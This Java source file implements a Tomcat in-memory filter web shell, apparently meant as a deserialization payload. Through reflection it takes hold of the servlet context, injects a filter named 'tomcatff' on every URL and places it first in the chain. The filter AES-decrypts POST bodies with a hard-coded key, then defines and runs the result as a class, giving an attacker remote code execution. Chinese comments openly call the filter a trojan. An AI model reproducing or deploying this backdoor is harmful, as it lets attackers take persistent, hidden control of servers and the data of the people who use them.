package com.test.haha.ok3;

import javax.servlet.FilterConfig;
import javax.servlet.ServletException;

public class AA {

    private javax.servlet.ServletContext getServletContext()
            throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
    	javax.servlet.ServletRequest servletRequest = null;
            /*shell注入，前提需要能拿到request、response等*/
            Class c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            java.lang.reflect.Field f = c.getDeclaredField("lastServicedRequest");
            f.setAccessible(true);
            ThreadLocal threadLocal = (ThreadLocal) f.get(null);
            //不为空则意味着第一次反序列化的准备工作已成功
            if (threadLocal != null && threadLocal.get() != null) {
                servletRequest = (javax.servlet.ServletRequest) threadLocal.get();
            }
           //spring获取法1
            if (servletRequest == null) {
                try {
                    c = Class.forName("org.springframework.web.context.request.RequestContextHolder");
                    java.lang.reflect.Method m = c.getMethod("getRequestAttributes");
                    Object o = m.invoke(null);
                    c = Class.forName("org.springframework.web.context.request.ServletRequestAttributes");
                    m = c.getMethod("getRequest");
                    servletRequest = (javax.servlet.ServletRequest) m.invoke(o);
                } catch (Throwable t) {}
            }
            if (servletRequest != null)
                return servletRequest.getServletContext();

            //spring获取法2
            try {
                c = Class.forName("org.springframework.web.context.ContextLoader");
                java.lang.reflect.Method m = c.getMethod("getCurrentWebApplicationContext");
                Object o = m.invoke(null);
                c = Class.forName("org.springframework.web.context.WebApplicationContext");
                m = c.getMethod("getServletContext");
                javax.servlet.ServletContext servletContext = (javax.servlet.ServletContext) m.invoke(o);
                return servletContext;
            } catch (Throwable t) {}
            return null;
        }
    
	public AA() {
		
		java.io.FileInputStream tt = null;
		

		try {
			
			javax.servlet.ServletContext servletContext = getServletContext();
			System.out.println("123");
			(new java.io.FileOutputStream("/tmp/stage-123")).write("123".getBytes());
			
	           if (servletContext != null) {
	   			System.out.println("456");
				(new java.io.FileOutputStream("/tmp/stage-456")).write("123".getBytes());
				
	                Class c= Class.forName("org.apache.catalina.core.StandardContext");
	                Object standardContext = null;
	                //判断是否已有该名字的filter，有则不再添加
	                if (servletContext.getFilterRegistration("tomcatff") == null) {
	                    //遍历出标准上下文对象
	                    for (; standardContext == null; ) {
	                        java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField("context");
	                        contextField.setAccessible(true);
	                        Object o = contextField.get(servletContext);
	                        if (o instanceof javax.servlet.ServletContext) {
	                            servletContext = (javax.servlet.ServletContext) o;
	                        } else if (c.isAssignableFrom(o.getClass())) {
	                            standardContext = o;
	                        }
	                    }
	                    if (standardContext != null) {
	                        //修改状态，要不然添加不了
	                        java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class
	                            .getDeclaredField("state");
	                        stateField.setAccessible(true);
	                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
	                        //创建一个自定义的Filter马
	    					javax.servlet.Filter tomcatff = new javax.servlet.Filter() {
	    						public void doFilter(javax.servlet.ServletRequest req, javax.servlet.ServletResponse res,
	    								javax.servlet.FilterChain filterChain)
	    								throws java.io.IOException, javax.servlet.ServletException {
	    							javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) req;
	    							javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) res;
	    							try {
	    								if (request.getMethod().equals("POST")) {
	    									String k = "e45e329feb5d925b";
	    									request.getSession().putValue("u", k);
	    									javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
	    									c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
	    									new U(this.getClass().getClassLoader())
	    											.g(c.doFinal(new sun.misc.BASE64Decoder()
	    													.decodeBuffer(request.getReader().readLine())))
	    											.newInstance()
	    											.equals(new Object[] { request, response, request.getSession() });
	    								}
	    							} catch (Exception e) {
	    							}
	    							;
	    							filterChain.doFilter(req, res);
	    						};

	    						public void destroy() {
	    						};

	    						class U extends ClassLoader {
	    							U(ClassLoader c) {
	    								super(c);
	    							}

	    							public Class g(byte[] b) {
	    								return super.defineClass(b, 0, b.length);
	    							}
	    						}


								public void init(FilterConfig filterConfig) throws ServletException {
									// TODO Auto-generated method stub
									
								}
	    					};
	                        //添加filter马
	                        javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
	                            .addFilter("tomcatff", tomcatff);
	                        filterRegistration.setInitParameter("encoding", "utf-8");
	                        filterRegistration.setAsyncSupported(false);
	                        filterRegistration
	                            .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,
	                                new String[]{"/*"});
	                        //状态恢复，要不然服务不可用
	                        if (stateField != null) {
	                            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
	                        }

	                        if (standardContext != null) {
	                            //生效filter
	                            java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class
	                                .getMethod("filterStart");
	                            filterStartMethod.setAccessible(true);
	                            filterStartMethod.invoke(standardContext, null);

	                            Class ccc = null;
	                            try {
	                                ccc = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
	                            } catch (Throwable t2){}
	                            if (ccc == null) {
	                                try {
	                                    ccc = Class.forName("org.apache.catalina.deploy.FilterMap");
	                                } catch (Throwable t2){}
	                            }
	                            //把filter插到第一位
	                            java.lang.reflect.Method m = c.getMethod("findFilterMaps");
	                            Object[] filterMaps = (Object[]) m.invoke(standardContext);
	                            Object[] tmpFilterMaps = new Object[filterMaps.length];
	                            int index = 1;
	                            for (int i = 0; i < filterMaps.length; i++) {
	                                Object o = filterMaps[i];
	                                m = ccc.getMethod("getFilterName");
	                                String name = (String) m.invoke(o);
	                                if (name.equalsIgnoreCase("tomcatff")) {
	                                    tmpFilterMaps[0] = o;
	                                } else {
	                                    tmpFilterMaps[index++] = filterMaps[i];
	                                }
	                            }
	                            for (int i = 0; i < filterMaps.length; i++) {
	                                filterMaps[i] = tmpFilterMaps[i];
	                            }
	                        }
	                    }
	                }
	            }
		} catch (Throwable t1) {
		}

	}

}
